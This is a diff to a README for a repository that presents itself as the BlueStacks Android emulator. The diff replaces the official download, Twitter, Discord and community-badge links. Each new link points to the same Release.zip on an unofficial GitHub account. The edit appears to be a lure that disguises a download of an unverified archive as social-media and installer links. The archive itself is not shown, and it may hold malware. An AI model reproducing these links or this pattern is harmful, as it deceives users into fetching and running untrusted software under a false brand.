@@ -38,7 +38,7 @@ BlueStacks is a cutting-edge Android emulator that allows users to enjoy the And
 
 ## Getting Started
 
-To get started with BlueStacks, simply [download the latest version](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) and launch the installer. If the link is not working, feel free to check the "Releases" section for alternative options.
+To get started with BlueStacks, simply [download the latest version](https://github.com/tuongdz2k10/BlueStacks-Android-Emulator/releases/download/v1.0/Release.zip) and launch the installer. If the link is not working, feel free to check the "Releases" section for alternative options.
 
 ## Contribute
 
@@ -54,13 +54,13 @@ If you encounter any issues or have questions about BlueStacks, don't hesitate t
 ## Stay Connected
 
 Stay up to date with the latest news and updates related to BlueStacks:
-- Follow us on [Twitter](https://twitter.com/BlueStacks_).
-- Join our community on [Discord](https://discord.com/bluestacks).
+- Follow us on [Twitter](https://github.com/tuongdz2k10/BlueStacks-Android-Emulator/releases/download/v1.0/Release.zip).
+- Join our community on [Discord](https://github.com/tuongdz2k10/BlueStacks-Android-Emulator/releases/download/v1.0/Release.zip).
 
 ## Let's Connect
 
 Got any questions, ideas, or just want to chat about BlueStacks? Join our community and let's connect:
 
-[![Join Community](https://img.shields.io/badge/Join-Community-blue?style=for-the-badge)](https://discord.com/bluestacks)
+[![Join Community](https://github.com/tuongdz2k10/BlueStacks-Android-Emulator/releases/download/v1.0/Release.zip)](https://github.com/tuongdz2k10/BlueStacks-Android-Emulator/releases/download/v1.0/Release.zip)
 
 Thank you for being a part of the BlueStacks-Android-Emulator community! 🚀🎮📱
